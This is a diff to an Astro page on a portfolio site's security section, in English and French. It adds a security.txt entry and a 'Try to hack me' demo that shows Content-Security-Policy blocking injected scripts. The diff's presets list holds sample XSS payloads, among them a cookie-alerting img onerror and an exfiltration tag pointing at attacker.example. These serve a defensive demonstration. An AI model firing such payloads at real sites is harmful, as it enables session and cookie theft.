@@ -35,6 +35,7 @@ const c = {
       ['Third-party requests', '0: fonts self-hosted, no CDN, no embeds', 'Page'],
       ['Cookies and trackers', '0: no analytics, no consent banner needed', 'Privacy'],
       ['Server-side attack surface', 'None: static HTML, no backend, no database, no forms', 'Architecture'],
+      ['security.txt', 'Published at /.well-known/security.txt (RFC 9116)', 'Disclosure'],
       ['Known vulnerabilities', '0 reported by npm audit', 'Supply chain'],
       ['Dependencies', `${deps} direct packages, all used at build time only`, 'Supply chain'],
     ],
@@ -47,6 +48,11 @@ const c = {
       ['Nothing third-party', 'Fonts are bundled with the site, there are no analytics, no social widgets and no CDN scripts. Visitors are not tracked, and a compromised third party cannot inject code here.'],
       ['Supply chain hygiene', 'A small dependency tree, a committed lockfile, and npm audit kept at 0. Astro was upgraded across two major versions to clear a critical advisory before it could matter.'],
     ],
+    hmHead: 'Try to hack me',
+    hmLead: 'Paste an XSS payload, or pick one below, and inject it. This page really inserts it into the DOM, using a method that would execute scripts. The only thing standing in the way is the Content-Security-Policy, and the log shows the browser blocking each attempt in real time.',
+    hmLabel: 'Payload', hmRun: 'Inject', hmStage: 'Injected output', hmLog: 'Browser security log',
+    hmNote: 'Runs only your own input, in your own browser. Nothing is sent anywhere.',
+    hm: { noCsp: 'No CSP detected in this environment (local preview?), so the demo is disabled for safety.', injected: 'payload inserted into the page', blocked: 'BLOCKED by', nothing: 'nothing to block: the payload contains no script, style or external resource', inline: 'inline code', removed: 'meta and base tags removed (they could redirect the page)' },
     verifyHead: 'Verify it yourself',
     verifyLead: 'Headers are public. These commands and scanners show exactly what the browser receives.',
     scanners: [['securityheaders.com', `https://securityheaders.com/?q=${encodeURIComponent(site)}&followRedirects=on`], ['Mozilla HTTP Observatory', `https://developer.mozilla.org/en-US/observatory/analyze?host=mouaadsek.vercel.app`]],
@@ -76,6 +82,7 @@ const c = {
       ['Requêtes tierces', '0 : polices hébergées sur le site, pas de CDN, pas d’intégrations', 'Page'],
       ['Cookies et traceurs', '0 : pas d’analytics, pas besoin de bandeau de consentement', 'Vie privée'],
       ['Surface d’attaque serveur', 'Aucune : HTML statique, pas de backend, pas de base, pas de formulaire', 'Architecture'],
+      ['security.txt', 'Publié sur /.well-known/security.txt (RFC 9116)', 'Divulgation'],
       ['Vulnérabilités connues', '0 signalée par npm audit', 'Supply chain'],
       ['Dépendances', `${deps} paquets directs, tous utilisés au build`, 'Supply chain'],
     ],
@@ -88,6 +95,11 @@ const c = {
       ['Rien de tiers', 'Les polices sont livrées avec le site, sans analytics, sans widgets sociaux ni scripts CDN. Les visiteurs ne sont pas suivis, et un tiers compromis ne peut pas injecter de code ici.'],
       ['Hygiène de la supply chain', 'Un arbre de dépendances réduit, un lockfile versionné et npm audit maintenu à 0. Astro a été mis à jour de deux versions majeures pour éliminer une alerte critique avant qu’elle ne compte.'],
     ],
+    hmHead: 'Essayez de me pirater',
+    hmLead: 'Collez une charge XSS, ou choisissez-en une ci-dessous, puis injectez-la. Cette page l’insère vraiment dans le DOM, avec une méthode qui exécuterait les scripts. La seule barrière est la Content-Security-Policy, et le journal montre le navigateur bloquer chaque tentative en temps réel.',
+    hmLabel: 'Charge', hmRun: 'Injecter', hmStage: 'Résultat injecté', hmLog: 'Journal de sécurité du navigateur',
+    hmNote: 'N’exécute que votre propre saisie, dans votre propre navigateur. Rien n’est envoyé nulle part.',
+    hm: { noCsp: 'Aucune CSP détectée dans cet environnement (aperçu local ?), la démo est donc désactivée par sécurité.', injected: 'charge insérée dans la page', blocked: 'BLOQUÉ par', nothing: 'rien à bloquer : la charge ne contient ni script, ni style, ni ressource externe', inline: 'code inline', removed: 'balises meta et base retirées (elles pourraient rediriger la page)' },
     verifyHead: 'Vérifiez vous-même',
     verifyLead: 'Les en-têtes sont publics. Ces commandes et scanners montrent exactement ce que reçoit le navigateur.',
     scanners: [['securityheaders.com', `https://securityheaders.com/?q=${encodeURIComponent(site)}&followRedirects=on`], ['Mozilla HTTP Observatory', `https://developer.mozilla.org/fr/observatory/analyze?host=mouaadsek.vercel.app`]],
@@ -101,6 +113,14 @@ const c = {
   },
 }[lang];
 const curl = `$ curl -sI ${site} | grep -iE "content-security|strict-transport|x-frame|referrer|permissions"`;
+const presets = [
+  ['img onerror', '<img src=x onerror="alert(document.cookie)">'],
+  ['details ontoggle', '<details open ontoggle="alert(1)"><summary>hi</summary></details>'],
+  ['script tag', '<script>alert("pwned")</script>'],
+  ['iframe', '<iframe src="https://example.com"></iframe>'],
+  ['exfiltration', '<img src="https://attacker.example/steal?c=session">'],
+  ['style', '<style>body{display:none}</style>'],
+];
 ---
 <Base lang={lang} title={c.title} description={c.desc}>
   <section class="relative overflow-hidden">
@@ -142,6 +162,30 @@ const curl = `$ curl -sI ${site} | grep -iE "content-security|strict-transport|x
           <p class="text-[15px] leading-relaxed text-muted">{p}</p>
         </div>
       ))}
+    </div>
+  </section>
+
+  <section id="hack-me" class="wrap flex scroll-mt-24 flex-col gap-5 pb-20" data-hackme={JSON.stringify(c.hm)}>
+    <h2 class="font-display text-4xl font-bold">{c.hmHead}</h2>
+    <p class="max-w-[820px] text-lg leading-relaxed text-muted">{c.hmLead}</p>
+    <div class="grid grid-cols-1 gap-4 lg:grid-cols-2">
+      <div class="flex flex-col gap-3 rounded-2xl border border-line bg-panel p-5">
+        <label for="hm-input" class="font-mono text-xs text-dim">{c.hmLabel}</label>
+        <textarea id="hm-input" data-hm-input rows="4" spellcheck="false" class="w-full resize-y rounded-xl border border-line-2 bg-[#0b0e0c] p-3 font-mono text-[13px] text-fg focus:border-accent focus:outline-none">{presets[0][1]}</textarea>
+        <div class="flex flex-wrap gap-2">
+          {presets.map(([label, code]) => <button type="button" data-hm-preset={code} class="min-h-9 cursor-pointer rounded-md border border-line-2 px-2.5 font-mono text-[11px] text-fg-2 hover:border-accent hover:text-accent">{label}</button>)}
+        </div>
+        <div class="flex flex-wrap items-center justify-between gap-3">
+          <button type="button" data-hm-run class="btn-primary min-h-11 px-5 text-sm disabled:cursor-not-allowed disabled:opacity-50">{c.hmRun}</button>
+          <span data-hm-status class="font-mono text-xs text-faint">{c.hmNote}</span>
+        </div>
+        <span class="mt-1 font-mono text-xs text-faint">{c.hmStage}</span>
+        <div data-hm-stage class="min-h-16 overflow-hidden rounded-xl border border-dashed border-line-2 bg-[#0b0e0c] p-3 text-sm text-muted"></div>
+      </div>
+      <div class="flex flex-col gap-3 rounded-2xl border border-line bg-[#0b0e0c] p-5">
+        <span class="flex items-center gap-2 font-mono text-xs text-dim"><span class="pulse-dot h-2 w-2 rounded-full bg-accent"></span>{c.hmLog}</span>
+        <ol data-hm-log aria-live="polite" class="flex max-h-[320px] flex-col gap-1.5 overflow-y-auto font-mono text-[12.5px] leading-relaxed"></ol>
+      </div>
     </div>
   </section>
 
